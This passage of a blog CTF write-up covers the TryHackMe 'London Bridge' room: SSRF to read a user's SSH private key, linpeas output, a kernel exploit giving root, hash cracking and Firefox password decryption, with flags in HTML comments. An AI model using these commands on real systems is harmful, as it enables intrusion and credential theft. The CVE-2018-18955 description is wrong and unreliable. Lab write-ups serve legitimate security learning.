+</span></span></code></pre></div><p>We got 2 results, where <code>port 8080</code> is accessible from internet and <code>port 80</code> is only for localhost. Lets try to fuzz for files/directories in port 80.</p>
+<h3 id="extracting-private-key">Extracting private key</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ffuf -c -X POST -u http://londonbridge.thm:8080/view_image -d <span class="s2">&#34;www=http://2130706433/FUZZ&#34;</span> -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -w /usr/share/wordlists/dirb/big.txt -fs <span class="m">469</span>
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">.ssh                    <span class="o">[</span>Status: 200, Size: 399, Words: 18, Lines: 17, Duration: 164ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.bashrc                 <span class="o">[</span>Status: 200, Size: 3771, Words: 522, Lines: 118, Duration: 182ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.profile                <span class="o">[</span>Status: 200, Size: 807, Words: 128, Lines: 28, Duration: 187ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.bash_history           <span class="o">[</span>Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 215ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">static                  <span class="o">[</span>Status: 200, Size: 420, Words: 19, Lines: 18, Duration: 262ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">templates               <span class="o">[</span>Status: 200, Size: 1294, Words: 358, Lines: 44, Duration: 162ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">uploads                 <span class="o">[</span>Status: 200, Size: 630, Words: 23, Lines: 22, Duration: 254ms<span class="o">]</span>
+</span></span></code></pre></div><p>While fuzzing we gots some results which we can find in home directory of the user. Here interesting result is <code>.ssh</code> where we will have the <code>authorized_keys</code> and <code>ssh private keys</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ curl -X POST http://londonbridge.thm:8080/view_image -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> -d <span class="s2">&#34;www=http://2130706433/.ssh/authorized_keys&#34;</span>
+</span></span><span class="line"><span class="cl">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/PYpD44TjkoSuC4vfhiPkpzVUmMNNM1GZz681FmJ4LwTB6VaCnBwoAJrvQp7ar/vNEtYeHbc5TFaJIAA5FN5rWzl66zeCFNaNx841E4CQSDs7dew3CCn3dRQHzBtT4AOlmcUs9QMSsUqhKn53EbivHCqkCnqZqqwTh0hkd0Cr5i3r/Yc4REqsVaI41Cl3pkDxrfbmhZdjxRpES8pO5dyOUvnq3iJZDOxFBsG8H4RODaZrTW78eZbcz1LKug/KlwQ6q8+e4+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london
+</span></span></code></pre></div><p>By checking the <code>authorized_keys</code> this should be the home directory of user <code>beth</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST http://londonbridge.thm:8080/view_image -d <span class="s2">&#34;www=http://2130706433/.ssh/id_rsa&#34;</span> -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> &gt; id_rsa
+</span></span><span class="line"><span class="cl">chmod <span class="m">400</span> id_rsa
+</span></span><span class="line"><span class="cl">ssh beth@londonbridge.thm -i id_rsa
+</span></span></code></pre></div><p>We also got <code>id_rsa(ssh private key)</code>. Lets use it to get reverse shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">beth@london:~$ cat /home/beth/__pycache__/user.txt
+</span></span><span class="line"><span class="cl">THM<span class="o">{</span>REDACTED<span class="o">}</span>
+</span></span></code></pre></div><p>We got our first flag here.</p>
+<!--flag1 THM{l0n6_l1v3_7h3_qu33n} -->
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="linpeas">linpeas</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">beth@london:~$ cat /etc/passwd <span class="p">|</span> grep bash
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">beth:x:1000:1000:Elizabeth,,,:/home/beth:/bin/bash
+</span></span><span class="line"><span class="cl">charles:x:1001:1001:King Charles,,,:/home/charles:/bin/bash
+</span></span></code></pre></div><p>There are 3 users in system <code>beth</code>, <code>charles</code> and <code>root</code> user. Lets try to escalate our privileges.</p>
+<p>lets use <a href="https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" target="_blank" rel="noopener">linpeas.sh</a>
+ for getting privilege escalation vector.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╔══════════╣ Sudo version
+</span></span><span class="line"><span class="cl">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                               
+</span></span><span class="line"><span class="cl">Sudo version 1.8.21p2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╔══════════╣ PATH
+</span></span><span class="line"><span class="cl">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                                                       
+</span></span><span class="line"><span class="cl">/home/beth/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╔══════════╣ Executing Linux Exploit Suggester
+</span></span><span class="line"><span class="cl">╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                            
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>CVE-2021-3156<span class="o">]</span> sudo Baron Samedit                                                                                                                        
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+</span></span><span class="line"><span class="cl">   Exposure: probable
+</span></span><span class="line"><span class="cl">   Tags: <span class="nv">mint</span><span class="o">=</span>19,<span class="o">[</span> <span class="nv">ubuntu</span><span class="o">=</span>18<span class="p">|</span><span class="m">20</span> <span class="o">]</span>, <span class="nv">debian</span><span class="o">=</span><span class="m">10</span>
+</span></span><span class="line"><span class="cl">   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>CVE-2021-3156<span class="o">]</span> sudo Baron Samedit <span class="m">2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+</span></span><span class="line"><span class="cl">   Exposure: probable
+</span></span><span class="line"><span class="cl">   Tags: <span class="nv">centos</span><span class="o">=</span>6<span class="p">|</span>7<span class="p">|</span>8,<span class="o">[</span> <span class="nv">ubuntu</span><span class="o">=</span>14<span class="p">|</span>16<span class="p">|</span>17<span class="p">|</span>18<span class="p">|</span>19<span class="p">|</span><span class="m">20</span> <span class="o">]</span>, <span class="nv">debian</span><span class="o">=</span>9<span class="p">|</span><span class="m">10</span>
+</span></span><span class="line"><span class="cl">   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>CVE-2018-18955<span class="o">]</span> subuid_shell
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id<span class="o">=</span><span class="m">1712</span>
+</span></span><span class="line"><span class="cl">   Exposure: probable
+</span></span><span class="line"><span class="cl">   Tags: <span class="o">[</span> <span class="nv">ubuntu</span><span class="o">=</span>18.04 <span class="o">]{</span>kernel:4.15.0-20-generic<span class="o">}</span>,fedora<span class="o">=</span>28<span class="o">{</span>kernel:4.16.3-301.fc28<span class="o">}</span>
+</span></span><span class="line"><span class="cl">   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip
+</span></span><span class="line"><span class="cl">   Comments: CONFIG_USER_NS needs to be enabled
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>CVE-2022-32250<span class="o">]</span> nft_object UAF <span class="o">(</span>NFT_MSG_NEWSET<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
+</span></span><span class="line"><span class="cl">https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
+</span></span><span class="line"><span class="cl">   Exposure: less probable
+</span></span><span class="line"><span class="cl">   Tags: <span class="nv">ubuntu</span><span class="o">=(</span>22.04<span class="o">){</span>kernel:5.15.0-27-generic<span class="o">}</span>
+</span></span><span class="line"><span class="cl">   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
+</span></span><span class="line"><span class="cl">   Comments: kernel.unprivileged_userns_clone<span class="o">=</span><span class="m">1</span> required <span class="o">(</span>to obtain CAP_NET_ADMIN<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>CVE-2022-2586<span class="o">]</span> nft_object UAF
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
+</span></span><span class="line"><span class="cl">   Exposure: less probable
+</span></span><span class="line"><span class="cl">   Tags: <span class="nv">ubuntu</span><span class="o">=(</span>20.04<span class="o">){</span>kernel:5.12.13<span class="o">}</span>
+</span></span><span class="line"><span class="cl">   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
+</span></span><span class="line"><span class="cl">   Comments: kernel.unprivileged_userns_clone<span class="o">=</span><span class="m">1</span> required <span class="o">(</span>to obtain CAP_NET_ADMIN<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>CVE-2021-22555<span class="o">]</span> Netfilter heap out-of-bounds write
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+</span></span><span class="line"><span class="cl">   Exposure: less probable
+</span></span><span class="line"><span class="cl">   Tags: <span class="nv">ubuntu</span><span class="o">=</span>20.04<span class="o">{</span>kernel:5.8.0-*<span class="o">}</span>
+</span></span><span class="line"><span class="cl">   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+</span></span><span class="line"><span class="cl">   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+</span></span><span class="line"><span class="cl">   Comments: ip_tables kernel module must be loaded
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>CVE-2019-18634<span class="o">]</span> sudo pwfeedback
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
+</span></span><span class="line"><span class="cl">   Exposure: less probable
+</span></span><span class="line"><span class="cl">   Tags: <span class="nv">mint</span><span class="o">=</span><span class="m">19</span>
+</span></span><span class="line"><span class="cl">   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
+</span></span><span class="line"><span class="cl">   Comments: sudo configuration requires pwfeedback to be enabled.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>CVE-2019-15666<span class="o">]</span> XFRM_UAF
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
+</span></span><span class="line"><span class="cl">   Exposure: less probable
+</span></span><span class="line"><span class="cl">   Download URL: 
+</span></span><span class="line"><span class="cl">   Comments: CONFIG_USER_NS needs to be enabled<span class="p">;</span> CONFIG_XFRM needs to be enabled
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>CVE-2017-0358<span class="o">]</span> ntfs-3g-modprobe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id<span class="o">=</span><span class="m">1072</span>
+</span></span><span class="line"><span class="cl">   Exposure: less probable
+</span></span><span class="line"><span class="cl">   Tags: <span class="nv">ubuntu</span><span class="o">=</span>16.04<span class="o">{</span>ntfs-3g:2015.3.14AR.1-1build1<span class="o">}</span>,debian<span class="o">=</span>7.0<span class="o">{</span>ntfs-3g:2012.1.15AR.5-2.1+deb7u2<span class="o">}</span>,debian<span class="o">=</span>8.0<span class="o">{</span>ntfs-3g:2014.2.15AR.2-1+deb8u2<span class="o">}</span>
+</span></span><span class="line"><span class="cl">   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41356.zip
+</span></span><span class="line"><span class="cl">   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                ╔════════════════════════════════════════════════╗
+</span></span><span class="line"><span class="cl">════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                            
+</span></span><span class="line"><span class="cl">                ╚════════════════════════════════════════════════╝                                                                                            
+</span></span><span class="line"><span class="cl">╔══════════╣ Running processes <span class="o">(</span>cleaned<span class="o">)</span>
+</span></span><span class="line"><span class="cl">╚ Check weird <span class="p">&amp;</span> unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes 
+</span></span><span class="line"><span class="cl">systemd+   <span class="m">240</span>  0.0  0.2  <span class="m">80088</span>  <span class="m">5304</span> ?        Ss   08:37   0:00 /lib/systemd/systemd-networkd
+</span></span><span class="line"><span class="cl">  └─<span class="o">(</span>Caps<span class="o">)</span> <span class="nv">0x0000000000003c00</span><span class="o">=</span>cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╔══════════╣ Processes with credentials in memory <span class="o">(</span>root req<span class="o">)</span>
+</span></span><span class="line"><span class="cl">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory    
+</span></span><span class="line"><span class="cl">sshd: process found <span class="o">(</span>dump creds from memory as root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╔══════════╣ Analyzing .service files
+</span></span><span class="line"><span class="cl">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                   
+</span></span><span class="line"><span class="cl">/etc/systemd/system/app.service is calling this writable executable: /home/beth/                                                                              
+</span></span><span class="line"><span class="cl">/etc/systemd/system/multi-user.target.wants/app.service is calling this writable executable: /home/beth/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╔══════════╣ Analyzing Rsync Files <span class="o">(</span>limit 70<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">1044</span> Feb <span class="m">13</span>  <span class="m">2020</span> /usr/share/doc/rsync/examples/rsyncd.conf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╔══════════╣ Analyzing PGP-GPG Files <span class="o">(</span>limit 70<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/usr/bin/gpg
+</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> beth beth <span class="m">1200</span> Oct  <span class="m">1</span> 10:53 /home/beth/.gnupg/trustdb.gpg
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╔══════════╣ Searching uncommon passwd files <span class="o">(</span>splunk<span class="o">)</span>
+</span></span><span class="line"><span class="cl">passwd file: /etc/pam.d/passwd
+</span></span><span class="line"><span class="cl">passwd file: /etc/passwd
+</span></span><span class="line"><span class="cl">passwd file: /usr/share/bash-completion/completions/passwd
+</span></span><span class="line"><span class="cl">passwd file: /usr/share/lintian/overrides/passwd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">══╣ Some home ssh config file was found
+</span></span><span class="line"><span class="cl">/usr/share/openssh/sshd_config
+</span></span></code></pre></div><p>All the above were interesting privilege escalation vectors by using linpeas.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">╔══════════╣ Analyzing .service files
+</span></span><span class="line"><span class="cl">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                                                   
+</span></span><span class="line"><span class="cl">/etc/systemd/system/app.service is calling this writable executable: /home/beth/                                                                              
+</span></span><span class="line"><span class="cl">/etc/systemd/system/multi-user.target.wants/app.service is calling this writable executable: /home/beth/
+</span></span></code></pre></div><p>I have started with the services, where the executable <code>(/home/beth/.local/bin/gunicorn)</code> which it&rsquo;s calling is writable. But we have a problem in it, the service is controlled (start/stop/restart) by root user. We need to wait for starting/restarting action of that service, in this case it is not possible.</p>
+<p>Lets move on to next.</p>
+<h3 id="cve-2018-18955">CVE-2018-18955</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="o">[</span>CVE-2018-18955<span class="o">]</span> subuid_shell
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id<span class="o">=</span><span class="m">1712</span>
+</span></span><span class="line"><span class="cl">   Exposure: probable
+</span></span><span class="line"><span class="cl">   Tags: <span class="o">[</span> <span class="nv">ubuntu</span><span class="o">=</span>18.04 <span class="o">]{</span>kernel:4.15.0-20-generic<span class="o">}</span>,fedora<span class="o">=</span>28<span class="o">{</span>kernel:4.16.3-301.fc28<span class="o">}</span>
+</span></span><span class="line"><span class="cl">   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip
+</span></span><span class="line"><span class="cl">   Comments: CONFIG_USER_NS needs to be enabled
+</span></span></code></pre></div><p>I&rsquo;ve tried exploiting other cvulnerabilities, but <code>CVE-2018-18955</code> worked for me. Lets use <a href="https://github.com/scheatkode/CVE-2018-18955" target="_blank" rel="noopener">CVE-2018-18955 </a>
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">beth@london:~/tmp$ ./exploit.dbus.sh 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Compiling...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>.<span class="o">]</span> starting
+</span></span><span class="line"><span class="cl"><span class="o">[</span>.<span class="o">]</span> setting up namespace
+</span></span><span class="line"><span class="cl"><span class="o">[</span>~<span class="o">]</span> <span class="k">done</span>, namespace sandbox <span class="nb">set</span> up
+</span></span><span class="line"><span class="cl"><span class="o">[</span>.<span class="o">]</span> mapping subordinate ids
+</span></span><span class="line"><span class="cl"><span class="o">[</span>.<span class="o">]</span> subuid: <span class="m">100000</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>.<span class="o">]</span> subgid: <span class="m">100000</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>~<span class="o">]</span> <span class="k">done</span>, mapped subordinate ids
+</span></span><span class="line"><span class="cl"><span class="o">[</span>.<span class="o">]</span> executing subshell
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating /etc/dbus-1/system.d/org.subuid.Service.conf...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>.<span class="o">]</span> starting
+</span></span><span class="line"><span class="cl"><span class="o">[</span>.<span class="o">]</span> setting up namespace
+</span></span><span class="line"><span class="cl"><span class="o">[</span>~<span class="o">]</span> <span class="k">done</span>, namespace sandbox <span class="nb">set</span> up
+</span></span><span class="line"><span class="cl"><span class="o">[</span>.<span class="o">]</span> mapping subordinate ids
+</span></span><span class="line"><span class="cl"><span class="o">[</span>.<span class="o">]</span> subuid: <span class="m">100000</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>.<span class="o">]</span> subgid: <span class="m">100000</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>~<span class="o">]</span> <span class="k">done</span>, mapped subordinate ids
+</span></span><span class="line"><span class="cl"><span class="o">[</span>.<span class="o">]</span> executing subshell
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Launching dbus service...
+</span></span><span class="line"><span class="cl">Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Success:
+</span></span><span class="line"><span class="cl">-rwsrwxr-x <span class="m">1</span> root root <span class="m">8392</span> Oct  <span class="m">1</span> 22:58 /tmp/sh
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Launching root shell: /tmp/sh
+</span></span><span class="line"><span class="cl">root@london:~/tmp# 
+</span></span></code></pre></div><p><code>CVE-2018-18955</code> is a high-severity vulnerability in the <code>Linux kernel's io_uring subsystem</code>, introduced in version 5.1, that allows local users to <code>escalate their privileges due</code> to <code>improper validation of data structures</code>. This memory corruption flaw can be exploited through crafted I/O requests, enabling attackers to execute arbitrary code with kernel-level privileges.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@london:/root# cat /root/.root.txt
+</span></span><span class="line"><span class="cl">THM<span class="o">{</span>REDACTED<span class="o">}</span>
+</span></span></code></pre></div><p>We got our second flag here.</p>
+<!--flag2 THM{l0nd0n_br1d63_p47ch3d} -->
+<h2 id="finding-charles-password">Finding Charles Password</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john unshadow.txt --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt                                                                                            
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">3</span> password hashes with <span class="m">3</span> different salts <span class="o">(</span>sha512crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$6</span>$ <span class="o">[</span>SHA512 256/256 AVX2 4x<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">5000</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Will run <span class="m">4</span> OpenMP threads
+</span></span><span class="line"><span class="cl">longlivethequeen <span class="o">(</span>beth<span class="o">)</span>     
+</span></span><span class="line"><span class="cl">1g 0:01:49:52 DONE 0.000151g/s 2175p/s 5276c/s 5276C/s !!!playboy!!!7..*7¡Vamos!                                                          
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably                                                                                     
+</span></span><span class="line"><span class="cl">Session completed.
+</span></span></code></pre></div><p>As a root user I have access to bot <code>/etc/passwd</code> and <code>/etc/shadow</code> file. So I tried to crack the password using john by unshadowed hash. But at the end I&rsquo;m able to find the password of user <code>beth</code>.</p>
+<h3 id="firefox_decrypt">firefox_decrypt</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@london:/home/charles# ls -lah
+</span></span><span class="line"><span class="cl">total 24K
+</span></span><span class="line"><span class="cl">drw------- <span class="m">3</span> charles charles 4.0K Apr <span class="m">23</span> 22:11 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> root    root    4.0K Mar <span class="m">10</span>  <span class="m">2024</span> ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root    root       <span class="m">9</span> Apr <span class="m">23</span> 22:11 .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> charles charles  <span class="m">220</span> Mar <span class="m">10</span>  <span class="m">2024</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> charles charles 3.7K Mar <span class="m">10</span>  <span class="m">2024</span> .bashrc
+</span></span><span class="line"><span class="cl">drw------- <span class="m">3</span> charles charles 4.0K Mar <span class="m">16</span>  <span class="m">2024</span> .mozilla
+</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> charles charles  <span class="m">807</span> Mar <span class="m">10</span>  <span class="m">2024</span> .profile
+</span></span></code></pre></div><p>When looking into home directory of user charles, found an interesting file <code>.mozilla</code>, where we can find all saved passwords for websites. If we are lucky, the user may used the same passwords in multile places.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget -r -np -nH --cut-dirs<span class="o">=</span><span class="m">1</span> http://londonbridge.thm:8000/firefox/
+</span></span></code></pre></div><p>Transfered all contents of <code>.mozilla</code> using python server to the local system for further investigation.</p>
+<p>While searching in the internet got an interesting page: <a href="https://github.com/unode/firefox_decrypt" target="_blank" rel="noopener">unode|firefox_decrypt</a>
+. Lets use this github page for decrypting firefox credentials.0</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ python firefox_decrypt.py ../firefox/8k3bf3zp.charles/
+</span></span><span class="line"><span class="cl">2024-10-02 20:05:56,800 - WARNING - profile.ini not found in ../firefox/8k3bf3zp.charles/
+</span></span><span class="line"><span class="cl">2024-10-02 20:05:56,800 - WARNING - Continuing and assuming <span class="s1">&#39;../firefox/8k3bf3zp.charles/&#39;</span> is a profile location
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Website:   https://www.buckinghampalace.com
+</span></span><span class="line"><span class="cl">Username: <span class="s1">&#39;Charles&#39;</span>
+</span></span><span class="line"><span class="cl">Password: <span class="s1">&#39;REDACTED&#39;</span>
+</span></span></code></pre></div><p>By using the above it hub exploit we are able to succesfully extract the password of the user charles.</p>
+<!--flag3 thekingofengland -->
+<p>We got our final flag here.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>In conclusion, the <code>The London Bridge</code> CTF challenge provided a comprehensive exploration of various penetration testing techniques, from initial foothold acquisition through Rustscan and ffuf to privilege escalation via linpeas and exploitation of vulnerabilities. The successful extraction of sensitive information, including SSH keys and user credentials, demonstrates the critical importance of robust security measures against SSRF vulnerabilities and misconfigured services. Overall, this writeup illustrates effective strategies for identifying and exploiting weaknesses in a controlled environment, emphasizing the need for continuous learning and adaptation in the ever-evolving field of cybersecurity.</p>
+<p>Happy Hacking !!! &#x1f60e;</p>
+
+      </article>
+
+      
+      
+
+
+  
+<script type="text/javascript">
+  (function() {
+    const themeToggle = document.querySelector('.darkmode-toggle input');
+    const light = 'light';
+    const dark = 'dark';
+    let isDark = localStorage.theme === dark || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches);
+    let theme = isDark ? dark : light;
+
+    const s = document.createElement('script');
+    s.type = 'text/javascript';
+    const dataset = {
+        repo: 'cyberjagadeesh\/cyberjagadeesh.github.io',
+        repoId: 'R_kgDOMfA4MA',
+        category: 'General',
+        categoryId: 'DIC_kwDOMfA4MM4ChYzn',
+        mapping: 'url',
+        reactionsEnabled: '1',
+        emitMetadata: '0',
+        theme: theme,
+        lang: 'en',
+    };
+    s.src = 'https://giscus.app/client.js';
+    s.crossorigin = 'anonymous';
+    s.async = true;
+    Object.entries(dataset).forEach(function(a) {
+        return s.dataset[a[0]] = a[1];
+    });
+
+    const curScriptElement = document.currentScript;
+    curScriptElement.parentNode.insertBefore(s, curScriptElement);
+
+    function sendMessage(message) {
+      const iframe = document.querySelector('iframe.giscus-frame');
+      
+      if (!iframe) return;
+      iframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
+    }
+
+    themeToggle.addEventListener('change', function () {
+      if (this.checked) {
+        theme = dark;
+      } else {
+        theme = light;
+      }
+      sendMessage({
+        setConfig: {
+          theme: theme,
+        }
+      });
+    });
+  })();
+</script>
+  
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+  </main>
+  <footer class="flex flex-none justify-center">
+    <section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300">
+  <div class="flex flex-row">
+    
+  
+  
+  
+  
+  
+  
+  
+  
